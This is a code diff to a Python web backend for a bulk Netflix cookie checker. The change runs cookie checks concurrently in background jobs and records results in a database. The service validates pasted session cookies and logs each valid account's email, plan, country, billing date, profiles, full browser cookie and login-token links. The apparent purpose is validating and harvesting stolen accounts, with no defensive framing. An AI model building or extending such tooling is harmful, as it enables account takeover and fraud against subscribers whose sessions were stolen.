@@ -636,6 +636,58 @@ async def get_me(user: dict = Depends(get_current_user)):
     return {"id": user["id"], "label": user["label"], "is_master": user["is_master"]}
 
 # --- Cookie Check Routes ---
+
+# Concurrency limiter for cookie checks
+_check_semaphore = asyncio.Semaphore(5)
+
+async def check_cookie_with_semaphore(block, format_type, job_id, index, total, user):
+    async with _check_semaphore:
+        result = await check_netflix_cookie(block, format_type)
+        # Update job progress in DB
+        await db.checks.update_one(
+            {"id": job_id},
+            {
+                "$push": {"results": result},
+                "$inc": {
+                    "checked_count": 1,
+                    "valid_count": 1 if result["status"] == "valid" else 0,
+                    "expired_count": 1 if result["status"] == "expired" else 0,
+                    "invalid_count": 1 if result["status"] == "invalid" else 0,
+                }
+            }
+        )
+        # Log valid cookies
+        if result["status"] == "valid":
+            await db.valid_logs.insert_one({
+                "id": str(uuid.uuid4()),
+                "checked_by_key": user["id"],
+                "checked_by_label": user["label"],
+                "email": result.get("email"),
+                "plan": result.get("plan"),
+                "country": result.get("country"),
+                "member_since": result.get("member_since"),
+                "next_billing": result.get("next_billing"),
+                "profiles": result.get("profiles", []),
+                "browser_cookies": result.get("browser_cookies", ""),
+                "full_cookie": result.get("full_cookie", ""),
+                "nftoken": result.get("nftoken"),
+                "nftoken_link": result.get("nftoken_link"),
+                "created_at": datetime.now(timezone.utc).isoformat()
+            })
+        return result
+
+async def run_bulk_check(job_id, cookie_blocks, format_type, user):
+    try:
+        tasks = [
+            check_cookie_with_semaphore(block, format_type, job_id, i, len(cookie_blocks), user)
+            for i, block in enumerate(cookie_blocks)
+        ]
+        await asyncio.gather(*tasks)
+        await db.checks.update_one({"id": job_id}, {"$set": {"status": "done"}})
+    except Exception as e:
+        logger.error(f"Bulk check error for job {job_id}: {e}")
+        await db.checks.update_one({"id": job_id}, {"$set": {"status": "done"}})
+
 @api_router.post("/check")
 async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_current_user)):
     cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', data.cookies_text.strip())
@@ -644,54 +696,28 @@ async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_curre
     if not cookie_blocks:
         raise HTTPException(status_code=400, detail="No cookies found")
 
-    results = []
-    for block in cookie_blocks:
-        result = await check_netflix_cookie(block, data.format_type)
-        results.append(result)
-
     check_id = str(uuid.uuid4())
-    valid_count = sum(1 for r in results if r["status"] == "valid")
-    expired_count = sum(1 for r in results if r["status"] == "expired")
-    invalid_count = sum(1 for r in results if r["status"] == "invalid")
+    total = len(cookie_blocks)
 
     await db.checks.insert_one({
         "id": check_id,
         "user_id": user["id"],
-        "results": results,
-        "total": len(results),
-        "valid_count": valid_count,
-        "expired_count": expired_count,
-        "invalid_count": invalid_count,
+        "results": [],
+        "total": total,
+        "checked_count": 0,
+        "valid_count": 0,
+        "expired_count": 0,
+        "invalid_count": 0,
+        "status": "processing",
         "created_at": datetime.now(timezone.utc).isoformat()
     })
 
-    # Log valid cookies to admin log
-    for r in results:
-        if r["status"] == "valid":
-            await db.valid_logs.insert_one({
-                "id": str(uuid.uuid4()),
-                "checked_by_key": user["id"],
-                "checked_by_label": user["label"],
-                "email": r.get("email"),
-                "plan": r.get("plan"),
-                "country": r.get("country"),
-                "member_since": r.get("member_since"),
-                "next_billing": r.get("next_billing"),
-                "profiles": r.get("profiles", []),
-                "browser_cookies": r.get("browser_cookies", ""),
-                "full_cookie": r.get("full_cookie", ""),
-                "nftoken": r.get("nftoken"),
-                "nftoken_link": r.get("nftoken_link"),
-                "created_at": datetime.now(timezone.utc).isoformat()
-            })
+    asyncio.create_task(run_bulk_check(check_id, cookie_blocks, data.format_type, user))
 
     return {
         "id": check_id,
-        "results": results,
-        "total": len(results),
-        "valid_count": valid_count,
-        "expired_count": expired_count,
-        "invalid_count": invalid_count
+        "total": total,
+        "status": "processing"
     }
 
 @api_router.post("/check/file")
